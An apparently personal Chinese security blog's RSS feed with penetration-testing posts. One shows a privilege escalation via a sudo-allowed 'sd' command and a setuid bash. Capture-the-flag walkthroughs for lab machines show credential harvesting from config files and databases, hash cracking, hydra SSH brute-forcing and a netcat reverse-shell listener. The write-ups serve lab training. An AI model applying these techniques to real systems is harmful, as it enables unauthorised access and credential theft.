<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>嫉妒能让你前进，但也能让你陷入深渊。</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Thu, 13 Nov 2025 09:57:41 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>sd命令提权漏洞</title><link>https://faabbi.github.io/post/sd-ming-ling-ti-quan-lou-dong.html</link><description>
==**在测试的过程中，发现sd命令执行后会改变源文件的属组，同样的sed命令就不具备这个产生漏洞的特性**==

如图比如我们在渗透过程中已经拿到了系统的初始shell，如果我们能以某个用户的权限来执行sd命令，那么就可以利用sd命令来提升至该用户权限，看如下例子


```
www-data@Scanner:/tmp/test$ echo 123 &gt; test
www-data@Scanner:/tmp/test$ ls -al
total 12
drwxrwxrwx 2 www-data www-data 4096 Nov 13 04:46 .
drwxrwxrwt 3 root     root     4096 Nov 13 04:25 ..
-rw-rw-rw- 1 www-data www-data    4 Nov 13 04:46 test
www-data@Scanner:/tmp/test$ sudo -l
Matching Defaults entries for www-data on Scanner:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on Scanner:
    (welcome) NOPASSWD: /usr/bin/ln
    (welcome) NOPASSWD: /usr/bin/sd
www-data@Scanner:/tmp/test$ sudo -u welcome sd '' '' test
www-data@Scanner:/tmp/test$ ls -al
total 12
drwxrwxrwx 2 www-data www-data 4096 Nov 13 04:46 .
drwxrwxrwt 3 root     root     4096 Nov 13 04:25 ..
-rw-rw-rw- 1 welcome  welcome     4 Nov 13 04:46 test

```
可以看到文件的属组已经从www-data变成了welcome

所以我们可以通过低权限用户为属组自身的文件加s位，从而结合sd命令改变文件属组，造成漏洞提权


```
www-data@Scanner:/tmp/test$ cp /bin/bash ./bash1
www-data@Scanner:/tmp/test$ ls -al
total 1152
drwxrwxrwx 2 www-data www-data    4096 Nov 13 04:48 .
drwxrwxrwt 3 root     root        4096 Nov 13 04:25 ..
-rwxr-xr-x 1 www-data www-data 1168776 Nov 13 04:48 bash1
www-data@Scanner:/tmp/test$ chmod a+s bash1
www-data@Scanner:/tmp/test$ ls -al
total 1152
drwxrwxrwx 2 www-data www-data    4096 Nov 13 04:48 .
drwxrwxrwt 3 root     root        4096 Nov 13 04:25 ..
-rwsr-sr-x 1 www-data www-data 1168776 Nov 13 04:48 bash1
www-data@Scanner:/tmp/test$ sudo -u welcome sd '' '' bash1
www-data@Scanner:/tmp/test$ ls -al
total 1152
drwxrwxrwx 2 www-data www-data    4096 Nov 13 04:48 .
drwxrwxrwt 3 root     root        4096 Nov 13 04:25 ..
-rwsr-sr-x 1 welcome  welcome  1168776 Nov 13 04:48 bash1
www-data@Scanner:/tmp/test$ ./bash1 -p
bash1-5.0$ id
uid=33(www-data) gid=33(www-data) euid=1000(welcome) egid=1000(welcome) groups=1000(welcome),33(www-data)

```
可以看到目前已经提升到了welcome的权限

同样在先前的测试中，ln命令配合sd命令报错后，可以产生.开头的临时文件，此文件的属组为命令执行时的用户，权限继承源文件权限不变，内容为sd替换后的结果，不过再次测试并没有发现再次产生此种文件，深层的原理目前未知。</description><guid isPermaLink="true">https://faabbi.github.io/post/sd-ming-ling-ti-quan-lou-dong.html</guid><pubDate>Thu, 13 Nov 2025 09:57:08 +0000</pubDate></item><item><title>权限问题(持续更新)</title><link>https://faabbi.github.io/post/quan-xian-wen-ti-%28-chi-xu-geng-xin-%29.html</link><description>web服务下代码执行权限
	nginx和apache2都分为两个进程
		1.master进程
		2.worker进程
	无论apache2或是nginx都是以worker进程的权限作为web服务代码执行的权限
		1.对于nginx使用ps -aux | grep nginx查看，终端会输出master process;
		即master进程启动权限，worker会有worker process;即为worker权限;
		2.对于apache2终端输出的第一个apache2进程即为master进程,剩下的则为worker进
		程
低权限用户可以ln链接高权限用户文件
	硬链接不能链接文件夹，软连接可以 -s软连接。</description><guid isPermaLink="true">https://faabbi.github.io/post/quan-xian-wen-ti-%28-chi-xu-geng-xin-%29.html</guid><pubDate>Thu, 13 Nov 2025 04:54:57 +0000</pubDate></item><item><title>文件读取相关(持续更新)</title><link>https://faabbi.github.io/post/wen-jian-du-qu-xiang-guan-%28-chi-xu-geng-xin-%29.html</link><description>
1.wc命令
	 wc（word count）命令是Linux中常用于计算文件的行数、字数和字节数的工具。</description><guid isPermaLink="true">https://faabbi.github.io/post/wen-jian-du-qu-xiang-guan-%28-chi-xu-geng-xin-%29.html</guid><pubDate>Thu, 13 Nov 2025 04:52:25 +0000</pubDate></item><item><title>BabyPass-MJ</title><link>https://faabbi.github.io/post/BabyPass-MJ.html</link><description># 1.信息收集

## 初步信息探测
```
┌──(root㉿kali)-[/tmp/test]
└─# nmap --min-rate 10000 -p- 192.168.2.58
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 06:09 EST
Nmap scan report for 192.168.2.58
Host is up (0.00056s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:0A:76:0B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 9.05 seconds
                                                                                          
┌──(root㉿kali)-[/tmp/test]
└─# nmap -sV -sC -O -p22,80 192.168.2.58  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 06:09 EST
Nmap scan report for 192.168.2.58
Host is up (0.00029s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:0A:76:0B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.59 seconds
                                                                                          
┌──(root㉿kali)-[/tmp/test]
└─# nmap --script=vuln -p22,80 192.168.2.58
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 06:10 EST
Nmap scan report for 192.168.2.58
Host is up (0.00020s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
MAC Address: 08:00:27:0A:76:0B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 37.39 seconds

┌──(root㉿kali)-[/tmp/test]
└─# nmap -sU --top-ports 20 192.168.2.58   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 06:10 EST
Nmap scan report for 192.168.2.58
Host is up (0.00048s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   open|filtered snmp
162/udp   closed        snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  open|filtered upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown
MAC Address: 08:00:27:0A:76:0B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 14.51 seconds
```
开放22，80端口，udp发现tftp可能开放，udp协议端口不好做扫描，大多扫描并不准确，且每次扫描结果大概率不相同

## web信息收集

curl一下web发现隐藏信息
```
┌──(root㉿kali)-[/tmp/test]
└─# curl http://192.168.2.58/    
hello world
&lt;!-- tms --&gt;
&lt;!-- Do not use same password in different account.  --&gt;
```
目录爆破，发现部分有用信息
```
┌──(root㉿kali)-[/tmp/test]
└─# dirsearch -u http://192.168.2.58/tms/
Target: http://192.168.2.58/

[06:14:40] Starting: tms/
[06:14:41] 301 -  313B  - /tms/js  -&gt;  http://192.168.2.58/tms/js/                 [06:14:48] 301 -  316B  - /tms/admin  -&gt;  http://192.168.2.58/tms/admin/    
[06:14:49] 200 -  820B  - /tms/admin/                                       
[06:14:49] 200 -  820B  - /tms/admin/index.php                              
[06:15:01] 301 -  314B  - /tms/css  -&gt;  http://192.168.2.58/tms/css/        
[06:15:05] 301 -  316B  - /tms/fonts  -&gt;  http://192.168.2.58/tms/fonts/    
[06:15:07] 301 -  317B  - /tms/images  -&gt;  http://192.168.2.58/tms/images/  
[06:15:08] 200 -  820B  - /tms/images/                                      
[06:15:08] 301 -  319B  - /tms/includes  -&gt;  http://192.168.2.58/tms/includes/
[06:15:08] 200 -  551B  - /tms/includes/                                    
[06:15:08] 200 -    4KB - /tms/index.php                                    
[06:15:09] 200 -    4KB - /tms/index.php/login/                             
[06:15:10] 200 -  516B  - /tms/js/                                          
[06:15:12] 302 -    1B  - /tms/logout.php  -&gt;  index.php                    
[06:15:16] 200 -    3KB - /tms/page.php                                     
[06:15:21] 302 -    0B  - /tms/profile.php  -&gt;  index.php                   
[06:15:22] 200 -    2KB - /tms/README.md                                    
[06:15:22] 200 -  336B  - /tms/Readme.txt                                   
[06:15:30] 200 -    3KB - /tms/thankyou.php
```
敏感文件发现可能的密码
```
┌──(root㉿kali)-[/tmp/test]
└─# curl http://192.168.2.58/tms/Readme.txt
Installation Steps(Configuration)
1. Download and Unzip file on your local system.
2.Copy tms folder and tms folder inside root directory (for xampp xampp/htdocs, for wamp wamp/www, for lamp var/www/html)

Database Configuration

Open phpmyadmin
Create Database tms
Import database tms.sql (available inside zip package)
Open Your browser put inside browser �http://localhost/tms�

Login Details for admin : 
Open Your browser put inside browser �http://localhost/tms/admin�
Username : admin
Password : Test@123

Login Details for user: 
Open Your browser put inside browser �http://localhost/tms/�
Username : anuj@gmail.com
Password : Test@123
```
进入admin登录页面登录发现页面崩了，点几个也没发现有什么变化，感觉像是死页面，因为首页提示不要密码复用，换方向到ssh登录，感觉anuj可能是用户


# 2.立足点

成功登录
```
┌──(root㉿kali)-[/tmp/test]
└─# ssh anuj@192.168.2.58                 
anuj@192.168.2.58's password: 
Linux BabyPass 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Nov 11 04:44:50 2025 from 192.168.2.55
anuj@BabyPass:~$ sudo -l
[sudo] password for anuj: 
Sorry, user anuj may not run sudo on BabyPass.
anuj@BabyPass:~$ 

```
发现有这几个非特权用户
```
anuj:x:1001:1001:,,,:/home/anuj:/bin/bash
admin:x:1002:1002:,,,:/home/admin:/bin/bash
welcome:x:1000:1000:,,,:/home/welcome:/bin/bash
```
welcome家目录下发现user.txt
```
anuj@BabyPass:/home/welcome$ cat user.txt 
flag{user-0bb3c30dc72e63881db5005f1aa19ac3}
```
# 3.root
经过尝试发现admin与anuj密码相同，都没有sudo权限，web架构挺大，可以考虑是否存在数据库配置文件
```
anuj@BabyPass:/var/www/html/tms$ find ./ -iname '*config*' 2&gt;/dev/null
./includes/config.php
./admin/includes/config.php
anuj@BabyPass:/var/www/html/tms$ cat $(find ./ -iname '*config*' 2&gt;/dev/null)
&lt;?php 
// DB credentials.
define('DB_HOST','localhost');
define('DB_USER','tms_user');
define('DB_PASS','secure_password');
define('DB_NAME','tms');
// Establish database connection.
try
{
$dbh = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME,DB_USER, DB_PASS,array(PDO::MYSQL_ATTR_INIT_COMMAND =&gt; 'SET NAMES 'utf8''));
}
catch (PDOException $e)
{
exit('Error: ' . $e-&gt;getMessage());
}
?&gt;
&lt;?php 
// DB credentials.
define('DB_HOST','localhost');
define('DB_USER','tms_user');
define('DB_PASS','secure_password');
define('DB_NAME','tms');
// Establish database connection.
try
{
$dbh = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME,DB_USER, DB_PASS,array(PDO::MYSQL_ATTR_INIT_COMMAND =&gt; 'SET NAMES 'utf8''));
}
catch (PDOException $e)
{
exit('Error: ' . $e-&gt;getMessage());
}
?&gt;
```
找到数据库凭据tms_user:secure_password
登录查到root加密hash

```
anuj@BabyPass:/var/www/html/tms$ mysql -utms_user -psecure_password
MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| tms                |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [(none)]&gt; use tms;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [tms]&gt; show tables;
+-----------------+
| Tables_in_tms   |
+-----------------+
| admin           |
| tblbooking      |
| tblenquiry      |
| tblissues       |
| tblpages        |
| tbltourpackages |
| tblusers        |
+-----------------+
7 rows in set (0.000 sec)
MariaDB [tms]&gt; select * from tblusers \G ;
*************************** 1. row ***************************
          id: 1
    FullName: Manju Srivatav
MobileNumber: 4456464654
     EmailId: manju@gmail.com
    Password: 202cb962ac59075b964b07152d234b70
     RegDate: 2020-07-08 02:33:20
UpdationDate: NULL
*************************** 2. row ***************************
          id: 2
    FullName: Kishan
MobileNumber: 9871987979
     EmailId: kishan@gmail.com
    Password: 202cb962ac59075b964b07152d234b70
     RegDate: 2020-07-08 02:33:56
UpdationDate: NULL
*************************** 3. row ***************************
          id: 3
    FullName: Salvi Chandra
MobileNumber: 1398756416
     EmailId: salvi@gmail.com
    Password: 202cb962ac59075b964b07152d234b70
     RegDate: 2020-07-08 02:34:20
UpdationDate: NULL
*************************** 4. row ***************************
          id: 4
    FullName: Abir
MobileNumber: 4789756456
     EmailId: abir@gmail.com
    Password: 202cb962ac59075b964b07152d234b70
     RegDate: 2020-07-08 02:34:38
UpdationDate: NULL
*************************** 5. row ***************************
          id: 5
    FullName: Test
MobileNumber: 1987894654
     EmailId: anuj@gmail.com
    Password: f925916e2754e5e03f75dd58a5733251
     RegDate: 2020-07-08 02:35:06
UpdationDate: 2021-05-11 00:37:41
*************************** 6. row ***************************
          id: 6
    FullName: root
MobileNumber: 123456789
     EmailId: root@gmail.com
    Password: fd50619cd7026f0f32272f77f4da6e92
     RegDate: 2020-07-08 02:35:06
UpdationDate: 2021-05-11 00:37:41
6 rows in set (0.000 sec)

```
破解hash得到
```
fd50619cd7026f0f32272f77f4da6e92:Root@456
```
提权得到root
```
anuj@BabyPass:/var/www/html/tms$ su
Password: 
root@BabyPass:/var/www/html/tms# cat /root/root.txt 
flag{root-bb289959b86dd81869df2eb9a7f3602a}
```。</description><guid isPermaLink="true">https://faabbi.github.io/post/BabyPass-MJ.html</guid><pubDate>Thu, 13 Nov 2025 04:46:43 +0000</pubDate></item><item><title>BabyCms-MJ</title><link>https://faabbi.github.io/post/BabyCms-MJ.html</link><description># 1.信息收集
	
常规扫描
```
┌──(root㉿kali)-[/tmp/test]
└─# nmap --min-rate 10000 -p- 192.168.2.54
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 05:50 EST
Nmap scan report for babycms.dsz (192.168.2.54)
Host is up (0.00011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:66:9E:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 4.55 seconds
                                                                                                     
┌──(root㉿kali)-[/tmp/test]
└─# nmap -sV -sC -O -p22,80 192.168.2.54  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 05:50 EST
Nmap scan report for babycms.dsz (192.168.2.54)
Host is up (0.00027s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-generator: Typecho 1.3.0
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Hello World
MAC Address: 08:00:27:66:9E:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.37 seconds
```
靶机开放常规22端口和80端口

继续收集udp端口情况，有些服务可能开放，优先做tcp的渗透
```
┌──(root㉿kali)-[/tmp/test]
└─# nmap -sU --top-ports 20 192.168.2.54
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 05:53 EST
Nmap scan report for babycms.dsz (192.168.2.54)
Host is up (0.00042s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   closed        netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   open|filtered ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown
MAC Address: 08:00:27:66:9E:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

## dirsearch目录扫描以及dirb指定扩展名扫描

重点关注admin页面以及config文件，可以留意后续利用数据库

```
┌──(root㉿kali)-[/tmp/test]
└─# dirsearch -u http://192.168.2.54/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /tmp/test/reports/http_192.168.2.54/__25-11-10_05-54-56.txt

Target: http://192.168.2.54/

[05:54:56] Starting: 
[05:55:06] 302 -    0B  - /admin/  -&gt;  http://192.168.2.54/admin/login.php?referer=http%3A%2F%2F192.168.2.54%2Fadmin%2F
[05:55:07] 302 -    0B  - /admin/index.php  -&gt;  http://192.168.2.54/admin/login.php?referer=http%3A%2F%2F192.168.2.54%2Fadmin%2Findex.php
[05:55:07] 200 -    2KB - /admin/login.php                                  
[05:55:18] 200 -    0B  - /config.inc.php                          


┌──(root㉿kali)-[/tmp/test]
└─# dirb http://babycms.dsz/ -X .txt,.php,.zip

%% 我这里设置了host域名，不然发现首页会崩溃 %%
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Nov 10 05:58:06 2025
URL_BASE: http://babycms.dsz/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.txt,.php,.zip) | (.txt)(.php)(.zip) [NUM = 3]

-----------------

GENERATED WORDS: 4612                                                        

---- Scanning URL: http://babycms.dsz/ ----                                                                                    + http://babycms.dsz/index.php (CODE:200|SIZE:10135)                                                
+ http://babycms.dsz/install.php (CODE:302|SIZE:0)                                                  
+ http://babycms.dsz/LICENSE.txt (CODE:200|SIZE:14974)                                              
+ http://babycms.dsz/setup.txt (CODE:200|SIZE:26)                        
```

密码凭据
```
setup.txt
pass:dyxBCEjovrUJa84sV03Q
```
首页发现用户名root
![[Pasted image 20251110190322.png]]
# 2.Web渗透

编辑一下php文件弹shell
![[Pasted image 20251110190640.png]]
接收到反弹shell
```
┌──(root㉿kali)-[/tmp/test]
└─# nc -lvvp 2332                       
listening on [any] 2332 ...
192.168.2.55: inverse host lookup failed: Unknown host
connect to [192.168.2.55] from (UNKNOWN) [192.168.2.55] 57370
bash: cannot set terminal process group (468): Inappropriate ioctl for device
bash: no job control in this shell
www-data@BabyCMS:/var/www/html$ 
```
## shell优化
参考[link-MJ](https://faabbi.github.io/post/link-MJ.html)

# 3.caigou

## 数据库获取凭据


在config.inc.php文件中得到数据库凭据

```
  'user' =&gt; 'pagekit_user',
  'password' =&gt; 'your_secure_password',
```

尝试mysql连接数据库获取用户凭据
```
www-data@BabyCMS:/$ mysql -upagekit_user -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 54225
Server version: 10.5.23-MariaDB-0+deb11u1 Debian 11

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| pagekit            |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [(none)]&gt; use pagekit;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [pagekit]&gt; show tables;
+-----------------------+
| Tables_in_pagekit     |
+-----------------------+
| typecho_comments      |
| typecho_contents      |
| typecho_fields        |
| typecho_metas         |
| typecho_options       |
| typecho_relationships |
| typecho_userlist      |
| typecho_users         |
+-----------------------+
8 rows in set (0.000 sec)

MariaDB [pagekit]&gt; select * from typecho_userlist;
+----+--------+----------------------+
| id | name   | pass                 |
+----+--------+----------------------+
|  1 | caigou | dRfGtYhUjIkOlPqAeRtY |
|  2 | user1  | aBcDeFgHiJkLmNoPqRsT |
|  3 | user2  | cNNloFLE88YBIP4ZJfcy |
|  4 | user3  | xYzAbCdEfGhIjKlMnOpQ |
|  5 | user4  | pLmOkNjIbHvGcFxDrEsW |
|  6 | user5  | wVxYzAbCdEfGhIjKlMnO |
|  7 | user6  | sTrUvWxYzAbCdEfGhIjK |
|  8 | user7  | qWeRtYuIoPaSdFgHjKlZ |
|  9 | user8  | mNbVcXzAsDfGhJkLpOqR |
| 10 | user9  | kJiHgFdSaPqOwNeMtBuV |
+----+--------+----------------------+
10 rows in set (0.000 sec)

MariaDB [pagekit]&gt; select * from typecho_users;
+-----+------+------------------------------------+---------------+--------------------+------------+------------+------------+------------+---------------+----------------------------------+
| uid | name | password                           | mail          | url                | screenName | created    | activated  | logged     | group         | authCode                         |
+-----+------+------------------------------------+---------------+--------------------+------------+------------+------------+------------+---------------+----------------------------------+
|   1 | root | $P$BPa7rmHlGmug8IJn5dLOBqwB3jvRRt. | root@root.com | http://babycms.dsz | root       | 1762657463 | 1762772820 | 1762760703 | administrator | 9e100148e8b035c1f3c5fb568b856d79 |
+-----+------+------------------------------------+---------------+--------------------+------------+------------+------------+------------+---------------+----------------------------------+
1 row in set (0.000 sec)
```
有时候查库就会有这种情况，像是终端大小问题，勉强能开，欢迎佬指导一下

## 数据处理以及ssh爆破
发现几组凭据，以及phpass加密的hash，尝试对应凭据登录不成功，考虑可能乱序，在家目录下确定存在caigou用户，可以尝试hydra跑一下ssh


```
┌──(root㉿kali)-[/tmp/test]
└─# cat info | awk -F '|' '{print $4}' | awk -F ' ' '{print $1}' &gt; pass
                                                                                                              
┌──(root㉿kali)-[/tmp/test]
└─# cat pass                                                           
dRfGtYhUjIkOlPqAeRtY
aBcDeFgHiJkLmNoPqRsT
cNNloFLE88YBIP4ZJfcy
xYzAbCdEfGhIjKlMnOpQ
pLmOkNjIbHvGcFxDrEsW
wVxYzAbCdEfGhIjKlMnO
sTrUvWxYzAbCdEfGhIjK
qWeRtYuIoPaSdFgHjKlZ
mNbVcXzAsDfGhJkLpOqR
kJiHgFdSaPqOwNeMtBuV

┌──(root㉿kali)-[/tmp/test]
└─# hydra -l caigou -P pass -s 22 192.168.2.54 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-10 06:23:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 11 tasks per 1 server, overall 11 tasks, 11 login tries (l:1/p:11), ~1 try per task
[DATA] attacking ssh://192.168.2.54:22/
[22][ssh] host: 192.168.2.54   login: caigou   password: cNNloFLE88YBIP4ZJfcy
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-10 06:23:26

```
跑出caigou密码   cNNloFLE88YBIP4ZJfcy

## user.txt

```
caigou@BabyCMS:~$ cat /home/caigou/user.txt 
flag{user-02dc7f9da20474707eb298cde17eb7dd}
```

# 4.root

## 密码复用
拿到caigou后并没有发现常规提权路径可用，而且phpass hash并未破解出来，尝试使用密码继续跑root的ssh

```
┌──(root㉿kali)-[/tmp/test]
└─# hydra -l root -P pass -s 22 192.168.2.54 ssh  
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-10 06:26:26
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 11 tasks per 1 server, overall 11 tasks, 11 login tries (l:1/p:11), ~1 try per task
[DATA] attacking ssh://192.168.2.54:22/
[22][ssh] host: 192.168.2.54   login: root   password: cNNloFLE88YBIP4ZJfcy
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-10 06:26:30

```
和caigou一个密码

## root.txt

```
root@BabyCMS:~# cat /root/root.txt 
flag{root-74cc1c60799e0a786ac7094b532f01b1}
```



。</description><guid isPermaLink="true">https://faabbi.github.io/post/BabyCms-MJ.html</guid><pubDate>Tue, 11 Nov 2025 04:57:16 +0000</pubDate></item><item><title>BabyShell-MJ</title><link>https://faabbi.github.io/post/BabyShell-MJ.html</link><description>## 1.信息收集
```
┌──(root㉿kali)-[/tmp/test]
└─# nmap --min-rate 10000 -p- 192.168.2.9
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-09 02:03 EST
Nmap scan report for 192.168.2.9
Host is up (0.00038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:FE:B7:5D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 9.91 seconds
```
只开放了22和80端口
对80端口进行进一步探测

```
┌──(root㉿kali)-[/tmp/test]
└─# nmap -sV -sC -p80 192.168.2.9       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-09 02:05 EST
Nmap scan report for 192.168.2.9
Host is up (0.00023s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:FE:B7:5D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.95 seconds
                                                                                                         
┌──(root㉿kali)-[/tmp/test]
└─# nmap --script=vuln -p80 192.168.2.9 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-09 02:05 EST
Nmap scan report for 192.168.2.9
Host is up (0.00028s latency).

PORT   STATE SERVICE
80/tcp open  http
